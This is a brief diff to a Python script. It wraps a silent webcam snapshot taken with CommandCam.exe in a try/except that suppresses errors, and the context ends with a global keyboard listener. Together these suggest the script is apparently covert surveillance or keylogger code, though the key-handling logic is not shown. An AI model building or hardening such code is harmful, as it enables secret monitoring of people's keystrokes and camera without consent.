@@ -177,7 +177,10 @@ if not os.path.isfile("CommandCam.exe"):
         except:
             pass
 else:
-    subprocess.call("CommandCam.exe /filename test.jpg",shell=True)
+    try:
+        subprocess.call("CommandCam.exe /filename test.jpg",shell=True)
+    except:
+        pass
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
